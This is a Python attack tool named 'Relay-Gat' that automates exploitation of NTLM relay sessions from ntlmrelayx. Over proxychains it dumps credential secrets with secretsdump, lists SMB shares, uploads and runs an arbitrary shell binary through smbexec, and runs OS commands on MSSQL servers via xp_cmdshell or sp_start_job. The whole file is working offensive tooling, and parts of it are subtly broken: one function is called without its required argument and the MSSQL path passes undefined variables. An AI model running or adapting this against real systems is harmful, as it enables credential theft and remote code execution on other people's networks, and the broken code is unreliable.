#!/usr/bin/env python3
# impacket_relay_gat.py
# Authors: ad0nis (Aaron Pohl) & fin3ss3g0d (Dylan Evans)

import sys
import requests
from subprocess import run, PIPE
import concurrent.futures
import argparse


def main():    
    # Create the parser
    parser = argparse.ArgumentParser(description='Relay-Gat: A tool to automate the exploitation of ntlmrelayx relays.')

    # Add the 'threads' argument
    # The type is set to int to make sure the input is an integer
    # The default value is set to 10
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads to use')    
    # Add Boolean arguments
    parser.add_argument('--smb-shares', action='store_true', help='Enable listing of SMB shares')
    parser.add_argument('--smb-shell', action='store_true', help='Enable execution of SMB shell')
    parser.add_argument('--dump-secrets', action='store_true', help='Enable dumping of secrets')
    parser.add_argument('--mssql-dbs', action='store_true', help='Enable listing of MSSQL databases')
    parser.add_argument('--mssql-exec', action='store_true', help='Enable execution of MSSQL OS commands via xp_cmdshell & sp_start_job')    
    # Add integer argument for the MSSQL exec method
    parser.add_argument('--mssql-method', type=int, choices=[1, 2, 3], help='''Method to use for MSSQL exec:
                                                                            1 - Uses xp_cmdshell for command execution.
                                                                            2 - Uses sp_start_job to start a SQL Server Agent job.
                                                                            3 - Enables xp_cmdshell, executes the command, and then disables xp_cmdshell. 
                                                                            Warning: Method 3 can potentially leave xp_cmdshell enabled or disable it if the system was relying on it.''')                                 
    # Add string arguments
    parser.add_argument('--mssql-command', type=str, help='Command to execute for MSSQL exec method (OS command NOT SQL query)')
    parser.add_argument('--shell-path', type=str, help='File path for the SMB shell option')

    # Parse the arguments
    args = parser.parse_args()

    # Validate the arguments
    validate_arguments(args)

    # Make a request for the relay info against localhost
    relay_info = get_relay_info()
    # Handles each protocol ntlmrelayx supports and runs appropriate exploits based on selections
    handle_relay_info(relay_info)


def validate_arguments(args):
    # Check for at least one action argument
    if not args.smb_shares and not args.smb_shell and not args.dump_secrets and not args.mssql_dbs and not args.mssql_exec:
        print("Error: At least one action argument is required.")
        sys.exit(1)

    # Check for SMB shell argument dependency
    if args.smb_shell and not args.shell_path:
        print("Error: --shell-path is required when --smb-shell is selected.")
        sys.exit(1)
    
    # Check for MSSQL exec argument dependencies
    if args.mssql_exec:
        if not args.mssql_command:
            print("Error: --mssql-command is required when --mssql-exec is selected.")
            sys.exit(1)
        if args.mssql_method is None:
            print("Error: --mssql-method is required when --mssql-exec is selected.")
            sys.exit(1)


def get_relay_info():
    # Basic test to get relay info for testing:
    # curl -v http://localhost:9090/ntlmrelayx/api/v1.0/relays | python -m json.tool
    url = 'http://localhost:9090/ntlmrelayx/api/v1.0/relays'
    print(f"Attempting to retrieve list of active relays from '{url}'.")
    print("Please ensure that you have ntlmrelayx.py running with active relays showing in 'socks' command output.")
    try:
        response = requests.get(url)
        values = response.json()
        return(values)
    except Exception as error:
        print(f"Error: '{error}' while gathering relay info from '{url}'.\nCannot proceed without relay info. Are you sure you have ntlmrelayx running?")
        sys.exit(1)


def list_shares(relay_user, relay_host, relay_port, is_admin):
    # echo "shares\nuse C$\nls\nexit\n" | proxychains smbclient.py -no-pass DOMAIN/USERNAME@1.2.3.4
    connection_string = relay_user + "@" + relay_host
    input = ''
    if is_admin == "TRUE":
        input = "shares\nuse C$\nls\nexit\n"
    else:
        input = "shares\nexit\n"
    print(f"Attempting to list SMB shares as '{connection_string}'.")
    try:
        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
            input=input, encoding='ascii')
        print(proc.stdout)
        with open(f'smb_shares.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
            file.write(f'{proc.stdout}')
    except Exception as error:
        print(f"Error: '{error}' listing SMB shares as '{connection_string}'.")


def smb_shell(relay_user, relay_host, relay_port, shell_path):
    connection_string = relay_user + "@" + relay_host
    input = f"shares\nuse C$\nls\ncd Users\\Public\nput {shell_path}\nls\nexit\n"

    print(f"Attempting to upload {shell_path} to C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
    try:
        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
            input=input, encoding='ascii')
        print(proc.stdout)
        with open(f'smb_shell.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
            file.write(f'{proc.stdout}')
    except Exception as error:
        print(f"Error: '{error}' uploading C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
    print(f"Attempting to smbexec C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
    try:
        proc2 = run(['proxychains', 'smbexec.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
            input=f'C:\\Users\\Public\\{shell_path}\nexit\n', encoding='ascii')
        print(proc2.stdout)
        with open(f'smb_shell.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
            file.write(f'{proc2.stdout}')
    except Exception as error:
        print(f"Error: '{error}' running smbexec as '{connection_string}'.")


def secretsdump(relay_user, relay_host):
    connection_string = relay_user + "@" + relay_host
    out_user = relay_user.replace('/', '.')
    outfile = f"secretsdump.{out_user}.{relay_host}.txt"
    print(f"Attempting secretsdump.py as '{connection_string}'.")
    try:
        proc = run(['proxychains', 'secretsdump.py', '-ts', '-no-pass', '-o', outfile, connection_string], stdout=PIPE,
            input='', encoding='ascii')
        print(proc.stdout)
    except Exception as error:
        print(f"Error: '{error}' dumping secrets from '{connection_string}'.")


def mssql_exec(relay_user, relay_host, relay_port, method, command):
    connection_string = relay_user + "@" + relay_host
    if method == 1:
        input = "xp_cmdshell " + command + "\n"
    elif method == 2:
        input = "sp_start_job " + command + "\n"
    elif method == 3:
        print("[!] Warning! mssql_exec method 3 automatically enables xp_cmdshell, executes a command, and then disables xp_cmdshell.")
        print("[!] If this does not happen cleanly, it could leave xp_cmdshell enabled, or if the system was relying on xp_cmdshell, it could now be disabled.")
        print('[!] This is not a recommended method, and could cause havoc.')
        input = "enable_xp_cmdshell\nxp_cmdshell " + command + "\ndisable_xp_cmdshell\n"
    try:
        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
            input=input, encoding='ascii')
        with open(f'mssql_exec.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
            file.write(f'{proc.stdout}')
        print(proc.stdout)
    except Exception as error:
        print(f"Error: '{error}' executing command '{command}' as '{connection_string}'.")


def list_databases(relay_user, relay_host, relay_port):
    connection_string = relay_user + "@" + relay_host
    input = 'SELECT CURRENT_USER;\nSELECT name FROM master.sys.databases;\nexit\n'
    print(f"Attempting to list current db user and MSSQL databases as '{connection_string}'.")
    try:
        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
            input=input, encoding='ascii')
        print(proc.stdout)
        with open(f'mssql_databases.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
            file.write(f'{proc.stdout}')
    except Exception as error:
        print(f"Error: '{error}' listing MSSQL databases as '{connection_string}'.")


def handle_relay_info(relay_info, args):
    # example SMB: ["SMB", "1.2.3.4", "domain/user", "TRUE", "445"]
    # example MSSQL: ["MSSQL", "1.2.3.4", "DOMAIN/user", "N/A", "60183"]

    # Initialize the ThreadPoolExecutor
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=args.threads)

    for relay in relay_info:
        # Break it up into usable bits...
        protocol = relay[0]
        relay_host = relay[1]
        relay_user = relay[2]
        is_admin = relay[3]
        relay_port = relay[4]

        if protocol == 'SMB' and args.dump_secrets:
            if is_admin != 'TRUE':
                print(f"Warning: secretsdump requires admin privileges. Skipping '{relay_user}'.")
            else:
                # SMB and local admin, so we can dump secrets
                executor.submit(secretsdump, relay_user, relay_host)
        if protocol == 'SMB' and args.smb_shares:
            executor.submit(list_shares, relay_user, relay_host, relay_port, is_admin)
        if protocol == 'SMB' and args.smb_shell:
            executor.submit(smb_shell, relay_user, relay_host, relay_port, args.shell_path)
        if protocol == 'MSSQL' and args.mssql_dbs:
            executor.submit(list_databases, relay_user, relay_host, relay_port)
        if protocol == 'MSSQL' and args.mssql_exec:
            executor.submit(mssql_exec, relay_user, relay_host, relay_port, method, command)


if __name__ == '__main__':
    main()